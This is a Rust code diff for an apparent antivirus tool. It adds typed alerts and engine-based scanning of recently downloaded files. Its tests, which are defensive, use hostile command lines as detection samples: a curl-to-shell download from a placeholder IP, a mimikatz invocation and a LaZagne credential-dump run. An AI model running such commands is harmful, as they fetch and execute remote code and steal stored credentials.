@@ -9,6 +9,7 @@ use std::net::IpAddr;
 use std::path::{Path, PathBuf};
 
 use super::parametres::Categorie;
+use super::suites::Type;
 use crate::machine::chasse::{self, EnMarche};
 use crate::machine::regles::Os;
 use crate::protection::empreintes::{self, Empreintes};
@@ -57,6 +58,10 @@ pub(crate) struct Menace {
     /// Reconnue d'un passage à l'autre (« connexion:203.0.113.7 ») : une menace déjà bloquée n'est pas reproposée.
     pub cle: String,
     pub geste: Geste,
+    /// Le type d'alerte, qui choisit sa suite (`suites`), dit par ce qui l'a désignée ; `None` : pas de suite (un
+    /// démarrage, la liste des pilotes, un programme seulement douteux, un fichier suspect par heuristiques), le menu
+    /// des gestes de R1 seul.
+    pub type_alerte: Option<Type>,
 }
 
 /// Ce que la recherche a trouvé, et ce qu'elle n'a pas pu vérifier (dit, jamais compté comme sain).
@@ -136,6 +141,9 @@ impl Menace {
 const TELECHARGES_MAX: u64 = 64 << 20;
 const TELECHARGES_NOMBRE: usize = 300;
 const SEMAINE: std::time::Duration = std::time::Duration::from_hours(7 * 24);
+/// Le temps du moteur pour tous ces fichiers, puis pour un seul : la recherche reste courte, même en surveillance.
+const TELECHARGES_DELAI: std::time::Duration = std::time::Duration::from_secs(60);
+const TELECHARGE_DELAI: std::time::Duration = std::time::Duration::from_secs(15);
 
 // Un programme se juge par la voie unique des sources de menaces, comme au veilleur.
 pub(crate) use crate::protection::sources::{Jugement, juger_programme};
@@ -211,6 +219,7 @@ fn menace_programme(p: &EnMarche, j: Jugement) -> Menace {
     Menace {
         categorie: Categorie::Programmes,
         certaine: j.certaine,
+        type_alerte: j.type_alerte,
         quoi: trf!("« {nom} » (PID {}) : {raison}", "“{nom}” (PID {}): {raison}", p.pid),
         cle: format!("programme:{}:{}", p.pid, p.chemin.as_deref().unwrap_or("")),
         geste: Geste::Programme {
@@ -233,7 +242,8 @@ pub(super) fn raison_rancongiciel() -> &'static str {
 }
 
 /// Ce qui désigne un fichier dont le garde des lancements a refusé le lancement : la suite « lancement refusé » lui
-/// revient (`suites::Type::LancementRefuse`).
+/// revient (`suites::Type::LancementRefuse`). Le garde n'existe que sous Linux.
+#[cfg(target_os = "linux")]
 pub(super) fn raison_lancement_refuse() -> &'static str {
     tr!(
         "lancement refusé par le garde (empreinte de ses listes, à confirmer)",
@@ -292,6 +302,7 @@ fn refus_du_garde(
         menaces.push(Menace {
             categorie: Categorie::Programmes,
             certaine: false,
+            type_alerte: Some(Type::LancementRefuse),
             quoi: trf!("« {nom} » ({montre}) : {raison}", "“{nom}” ({montre}): {raison}"),
             cle: format!("fichier:{}", chemin.display()),
             geste: Geste::Programme {
@@ -413,6 +424,7 @@ pub(super) fn rancongiciel(objet: &str, alerte: &str) -> Rancon {
                     certaine: false,
                     raison: raison_rancongiciel().to_string(),
                     script: None,
+                    type_alerte: Some(Type::Rancongiciel),
                 },
             );
             Rancon::Menace(m, intouchables)
@@ -447,8 +459,14 @@ fn programmes(empreintes: Option<&'static Empreintes>, os: Os, t: &mut Trouvees)
     }
     non_haches(&mut fichiers, t);
     t.intouchables = intouchables;
-    // Les fichiers arrivés dans Téléchargements cette semaine : seulement ceux que MalwareBazaar connaît.
-    let Some(e) = empreintes else { return };
+    telecharges(empreintes, t);
+}
+
+/// Les fichiers arrivés dans Téléchargements cette semaine, examinés par le moteur maison (`moteur::examiner` :
+/// empreintes, YARA, base ClamAV en continu, heuristiques), en une minute au plus pour tous. Ce qui n'a pas été lu
+/// en entier est dit, jamais compté sain.
+fn telecharges(empreintes: Option<&'static Empreintes>, t: &mut Trouvees) {
+    use crate::protection::moteur;
     let Some(dossier) = crate::protection::telechargement::dossier_telechargements() else {
         return;
     };
@@ -460,7 +478,7 @@ fn programmes(empreintes: Option<&'static Empreintes>, os: Os, t: &mut Trouvees)
             _ => None,
         })
         .collect();
-    let recents = std::fs::read_dir(&dossier)
+    let recents: Vec<PathBuf> = std::fs::read_dir(&dossier)
         .into_iter()
         .flatten()
         .flatten()
@@ -470,32 +488,104 @@ fn programmes(empreintes: Option<&'static Empreintes>, os: Os, t: &mut Trouvees)
             (m.is_file() && recent && m.len() <= TELECHARGES_MAX).then(|| f.path())
         })
         .filter(|c| !deja.contains(c))
-        .take(TELECHARGES_NOMBRE);
+        .take(TELECHARGES_NOMBRE)
+        .collect();
+    if recents.is_empty() {
+        return;
+    }
+    // Le blocage tourne en continu (P21) : base ClamAV aux empreintes seules ; les empreintes de MalwareBazaar déjà
+    // chargées par la recherche (rafraîchies quand elle le peut) remplacent celles gardées.
+    let mut sources = moteur::sources(moteur::Usage::EnContinu);
+    if empreintes.is_some() {
+        sources.malwarebazaar = empreintes;
+    }
+    t.non_verifie.extend(
+        sources
+            .manquantes
+            .iter()
+            .map(|m| trf!("Téléchargements : {m}", "Downloads: {m}")),
+    );
+    let debut = std::time::Instant::now();
+    let mut partiels = 0usize;
+    let mut non_lus = 0usize;
     for chemin in recents {
-        if empreintes::sha256(&chemin).is_some_and(|h| e.contient(&h)) {
-            let montre = chemin_affichable(&chemin);
-            let nom = chemin
-                .file_name()
-                .map_or_else(|| montre.clone(), |n| affichable(&n.to_string_lossy()));
-            let raison = crate::protection::sources::raison_empreinte();
-            t.menaces.push(Menace {
-                categorie: Categorie::Programmes,
-                certaine: true,
-                quoi: trf!(
-                    "« {nom} », dans Téléchargements : {raison}",
-                    "“{nom}”, in Downloads: {raison}"
-                ),
-                cle: format!("fichier:{}", chemin.display()),
-                geste: Geste::Programme {
-                    pid: None,
-                    nom: montre,
-                    chemin: Some(chemin.clone()),
-                    fichier: Some(chemin),
-                    detection: raison.to_string(),
-                },
-            });
+        let reste = TELECHARGES_DELAI.saturating_sub(debut.elapsed());
+        if reste.is_zero() {
+            non_lus = non_lus.saturating_add(1);
+            continue;
+        }
+        match moteur::examiner(&chemin, &sources, reste.min(TELECHARGE_DELAI)) {
+            Ok(r) => match menace_du_telecharge(chemin, &r) {
+                Some(m) => t.menaces.push(m),
+                None if !r.non_verifie.is_empty() => partiels = partiels.saturating_add(1),
+                None => {}
+            },
+            Err(()) => non_lus = non_lus.saturating_add(1),
         }
     }
+    if partiels > 0 {
+        t.non_verifie.push(trf!(
+            "Téléchargements : {partiels} fichier(s) lu(s) en partie (contenu non ouvert)",
+            "Downloads: {partiels} file(s) read in part (content not opened)"
+        ));
+    }
+    if non_lus > 0 {
+        t.non_verifie.push(trf!(
+            "Téléchargements : {non_lus} fichier(s) non examiné(s) (illisible ou délai dépassé)",
+            "Downloads: {non_lus} file(s) not examined (unreadable or time limit reached)"
+        ));
+    }
+}
+
+/// La menace d'un fichier des Téléchargements d'après le verdict du moteur. Certain (contenu exact reconnu) : bloqué
+/// tout seul si les réglages le permettent. Famille (règle YARA, signature ClamAV) : sa suite proposée, en un geste
+/// de la personne. Suspect (heuristiques seules) : une alerte avec les gestes de R1, sans suite ni geste automatique.
+/// Sain ou non vérifié : pas de menace.
+fn menace_du_telecharge(chemin: PathBuf, r: &crate::protection::moteur::Resultat) -> Option<Menace> {
+    use crate::protection::moteur::{Source, Verdict};
+    let (certaine, type_alerte, raison) = match r.verdict() {
+        Verdict::Certain(Source::EmpreinteMalwareBazaar, _) => (
+            true,
+            Some(Type::MalwareConnu),
+            crate::protection::sources::raison_empreinte().to_string(),
+        ),
+        Verdict::Certain(source, nom) => (
+            true,
+            Some(Type::MalwareConnu),
+            trf!("{} : {}", "{}: {}", source.nom(), affichable(&nom)),
+        ),
+        Verdict::Famille(source, nom) => (
+            false,
+            Some(Type::Famille),
+            trf!("{} : {}", "{}: {}", source.nom(), affichable(&nom)),
+        ),
+        Verdict::Suspect(_) => {
+            let signes: Vec<String> = r.indices.iter().map(crate::protection::moteur::Indice::texte).collect();
+            (false, None, trf!("suspect, {}", "suspicious, {}", signes.join(" ; ")))
+        }
+        Verdict::Sain | Verdict::NonVerifie(_) => return None,
+    };
+    let montre = chemin_affichable(&chemin);
+    let nom = chemin
+        .file_name()
+        .map_or_else(|| montre.clone(), |n| affichable(&n.to_string_lossy()));
+    Some(Menace {
+        categorie: Categorie::Programmes,
+        certaine,
+        type_alerte,
+        quoi: trf!(
+            "« {nom} », dans Téléchargements : {raison}",
+            "“{nom}”, in Downloads: {raison}"
+        ),
+        cle: format!("fichier:{}", chemin.display()),
+        geste: Geste::Programme {
+            pid: None,
+            nom: montre,
+            chemin: Some(chemin.clone()),
+            fichier: Some(chemin),
+            detection: raison,
+        },
+    })
 }
 
 fn connexions(t: &mut Trouvees) {
@@ -522,6 +612,7 @@ fn connexions(t: &mut Trouvees) {
         t.menaces.push(Menace {
             categorie: Categorie::Connexions,
             certaine: true,
+            type_alerte: Some(Type::ServeurDeCommande),
             quoi: trf!(
                 "{programme}{pid} parle à un serveur de commande connu : {}",
                 "{programme}{pid} talks to a known command server: {}",
@@ -576,6 +667,7 @@ fn demarrage(empreintes: Option<&'static Empreintes>, os: Os, t: &mut Trouvees) 
         t.menaces.push(Menace {
             categorie: Categorie::Demarrage,
             certaine,
+            type_alerte: None,
             quoi: trf!(
                 "« {nom} » se lance au démarrage : {raison}",
                 "“{nom}” starts at login: {raison}"
@@ -640,6 +732,7 @@ fn pilotes(t: &mut Trouvees) {
         t.menaces.push(Menace {
             categorie: Categorie::Demarrage,
             certaine: false,
+            type_alerte: None,
             quoi: raison.to_string(),
             cle: "pilotes-vulnerables".into(),
             geste: Geste::Pilotes { avant: valeur },
@@ -677,6 +770,7 @@ fn agents(t: &mut Trouvees) {
                 t.menaces.push(Menace {
                     categorie: Categorie::AgentsIa,
                     certaine: false,
+                    type_alerte: Some(Type::AgentIa),
                     quoi: trf!(
                         "{nom} ouvert au réseau sans mot de passe (port {port})",
                         "{nom} open to the network without a password (port {port})"
@@ -706,6 +800,7 @@ fn agents(t: &mut Trouvees) {
             t.menaces.push(Menace {
                 categorie: Categorie::AgentsIa,
                 certaine: false,
+                type_alerte: Some(Type::AgentIa),
                 quoi: trf!(
                     "{outil} réglé pour tout faire sans demander (bypassPermissions) : {montre}",
                     "{outil} set to do everything without asking (bypassPermissions): {montre}"
@@ -967,7 +1062,10 @@ mod tests {
             r"C:\Users\alice\Downloads\mimikatz.exe",
             "mimikatz.exe privilege::debug",
         );
-        assert!(juger_programme(&mimikatz, Os::Windows, &mut jamais).is_some_and(|j| j.certaine));
+        assert!(
+            juger_programme(&mimikatz, Os::Windows, &mut jamais)
+                .is_some_and(|j| j.certaine && j.type_alerte == Some(Type::OutilDAttaque))
+        );
         let mineur = programme(
             "svc-update",
             "/home/alice/.cache/svc-update",
@@ -976,15 +1074,20 @@ mod tests {
         assert_eq!(juger_programme(&mineur, Os::Linux, &mut jamais), None);
         let mut connu = |c: &str| c == "/home/alice/.cache/svc-update";
         assert!(
-            juger_programme(&mineur, Os::Linux, &mut connu)
-                .is_some_and(|j| j.certaine && j.raison.contains("MalwareBazaar"))
+            juger_programme(&mineur, Os::Linux, &mut connu).is_some_and(|j| j.certaine
+                && j.raison.contains("MalwareBazaar")
+                && j.type_alerte == Some(Type::MalwareConnu))
         );
         let telechargeur = programme(
             "bash",
             "/home/alice/.local/bin/bash2",
             "bash -c curl http://203.0.113.7/x | sh",
         );
-        assert!(juger_programme(&telechargeur, Os::Linux, &mut jamais).is_some_and(|j| !j.certaine));
+        // Un doute de la chasse n'a pas de type : pas de suite, le menu des gestes seul.
+        assert!(
+            juger_programme(&telechargeur, Os::Linux, &mut jamais)
+                .is_some_and(|j| !j.certaine && j.type_alerte.is_none())
+        );
         let lance = programme(
             "facture",
             "/home/alice/Downloads/facture",
@@ -995,12 +1098,77 @@ mod tests {
             &lance,
             Jugement {
                 certaine: false,
+                type_alerte: None,
                 raison: "x".into(),
                 script: None,
             },
         );
         assert_eq!(m.categorie, Categorie::Programmes);
         assert!(matches!(m.geste, Geste::Programme { pid: Some(4242), .. }));
+    }
+
+    /// Un fichier téléchargé jugé par le moteur : une signature sûre est certaine (suite « malware connu », geste
+    /// automatique selon les réglages), une famille demande un clic (suite « famille »), un suspect n'est qu'une
+    /// alerte sans type ni suite ; un fichier sain ou non vérifié ne fait pas de menace (le manque est dit ailleurs).
+    #[test]
+    fn telecharge_juge_par_le_moteur() {
+        use crate::protection::heuristiques::Heuristique;
+        use crate::protection::moteur::{Indice, Resultat, Source, Trouvaille};
+        let chemin = PathBuf::from("/home/alice/Downloads/facture.pdf.exe");
+        let vide = Resultat {
+            sha256: Some([7; 32]),
+            ..Default::default()
+        };
+        let trouve = |source| Resultat {
+            trouvailles: vec![Trouvaille {
+                source,
+                nom: "Win.Trojan.Essai".into(),
+                partie: String::new(),
+            }],
+            ..vide.clone()
+        };
+        let certain = menace_du_telecharge(chemin.clone(), &trouve(Source::EmpreinteClamav)).unwrap();
+        assert!(certain.certaine);
+        assert_eq!(certain.type_alerte, Some(Type::MalwareConnu));
+        assert_eq!(certain.cle, "fichier:/home/alice/Downloads/facture.pdf.exe");
+        assert!(matches!(
+            &certain.geste,
+            Geste::Programme { pid: None, fichier: Some(f), detection, .. }
+                if f == &chemin && detection.contains("Win.Trojan.Essai")
+        ));
+        let mb = menace_du_telecharge(chemin.clone(), &trouve(Source::EmpreinteMalwareBazaar)).unwrap();
+        assert!(mb.certaine && mb.type_alerte == Some(Type::MalwareConnu));
+        let famille = menace_du_telecharge(chemin.clone(), &trouve(Source::Yara)).unwrap();
+        assert!(!famille.certaine);
+        assert_eq!(famille.type_alerte, Some(Type::Famille));
+        let suspect = Resultat {
+            indices: vec![Indice {
+                heuristique: Heuristique::NomTrompeur,
+                detail: ".pdf.exe".into(),
+                partie: String::new(),
+                cle: None,
+            }],
+            ..vide.clone()
+        };
+        let s = menace_du_telecharge(chemin.clone(), &suspect).unwrap();
+        assert!(!s.certaine);
+        assert_eq!(s.type_alerte, None);
+        // Même en automatique, accord donné, un suspect ou une famille ne vaut qu'un clic ; le certain part seul.
+        let auto = super::super::parametres::Parametres {
+            accord: Some("2026-11-08 10:00".into()),
+            programmes: super::super::parametres::Mode::Automatique,
+            ..Default::default()
+        };
+        let decision = |m: &Menace| super::super::parametres::decider(&auto, m.categorie, m.certaine);
+        assert_eq!(decision(&s), super::super::parametres::Decision::UnClic);
+        assert_eq!(decision(&famille), super::super::parametres::Decision::UnClic);
+        assert_eq!(decision(&certain), super::super::parametres::Decision::Auto);
+        assert!(menace_du_telecharge(chemin.clone(), &vide).is_none());
+        let non_lu = Resultat {
+            non_verifie: vec!["contenu PDF non ouvert".into()],
+            ..vide.clone()
+        };
+        assert!(menace_du_telecharge(chemin, &non_lu).is_none());
     }
 
     /// Défaut de la relecture : un argument qui ressemble au nom d'un outil ne rendait l'interpréteur « certain »,
@@ -1030,6 +1198,7 @@ mod tests {
         let lazagne = programme("python3", pyenv, "python3 /home/alice/outils/laZagne.py all");
         let j = juger_programme(&lazagne, Os::Linux, &mut jamais).unwrap();
         assert!(!j.certaine);
+        assert_eq!(j.type_alerte, Some(Type::OutilDAttaque));
         assert_eq!(j.script.as_deref(), Some("/home/alice/outils/laZagne.py"));
         // Ce qui est mis en quarantaine : le script désigné, jamais l'interpréteur.
         let partout = |_: &Path| true;
@@ -1166,6 +1335,7 @@ mod tests {
         Menace {
             categorie: Categorie::Programmes,
             certaine,
+            type_alerte: None,
             quoi: "« python3 » (PID 4242)".into(),
             cle: format!("programme:4242:{}", chemin.unwrap_or("")),
             geste: Geste::Programme {
@@ -1297,6 +1467,7 @@ mod tests {
         let menace = |cle: &str| Menace {
             categorie: Categorie::Programmes,
             certaine: true,
+            type_alerte: None,
             quoi: "q".into(),
             cle: cle.into(),
             geste: Geste::Adresse {
